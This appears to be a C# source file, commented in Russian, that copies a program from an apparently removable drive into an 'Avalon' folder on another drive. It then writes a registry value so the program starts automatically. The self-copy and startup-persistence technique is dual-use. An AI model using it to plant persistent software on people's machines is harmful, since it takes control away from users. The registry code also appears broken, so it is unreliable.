using System;
using System.IO;
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;

namespace Scout
{
    /// <summary>
    /// Добавление приложения
    /// </summary>
    public class AddApp
    {
        /// <summary>
        /// Путь копирования
        /// </summary>
        public static string pathToCopy;
        /// <summary>
        /// Игнор диска
        /// </summary>
        public static string driveC = @"C:\";
        /// <summary>
        /// Папка с приложением
        /// </summary>
        public static string subPath = @"Avalon";

        public static string newPath;

        /// <summary>
        /// Копирование приложения на компьютер
        /// </summary>
        public static void CopyApp()
        {
            DriveInfo[] driveInfos = DriveInfo.GetDrives();
            foreach (DriveInfo d in driveInfos)
            {
                if (d.IsReady)
                {

                    if (d.VolumeLabel.ToLower() != Windows_OS.nameMyDriver.ToLower() &&
                        d.Name.ToLower() != driveC.ToLower())
                    {
                        pathToCopy = d.Name;

                        // Создание подпапки
                        Directory.CreateDirectory(pathToCopy + subPath);

                        string path = Windows_OS.pathMyDriver + Program.name_Of_The_Program_To_Copy;
                        newPath = pathToCopy + subPath;
                        FileInfo fileInf = new FileInfo(path);
                        if (fileInf.Exists)
                        {
                            fileInf.CopyTo(newPath + @"\\" + Program.name_Of_The_Program_To_Copy, true);

                            StreamWriter streamWriter = new StreamWriter(Windows_OS.pathMyDriver + Windows_OS.nameFileForWin, true);
                            streamWriter.WriteLineAsync();
                            streamWriter.WriteLineAsync("Приложение установлено: " + newPath + "\\" + Program.name_Of_The_Program_To_Copy.ToString());
                            streamWriter.Close();

                            break;
                        }
                    }
                }
            }
            Writing_Keys_In_The_Register();
        }

        /// <summary>
        /// Пропись ключа в регистр для автозапуска
        /// </summary>
        public static void Writing_Keys_In_The_Register() // пусто
        {
            RegistryKey currentUserKey = Registry.CurrentUser;

                                             // CreateSubKey
            RegistryKey myKey = currentUserKey.OpenSubKey(@"Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" , true);
            myKey.SetValue("Avalon", newPath + @"\" + Program.name_Of_The_Program_To_Copy.ToString()); // 
            myKey.Close();

           

            
        }
    }
}
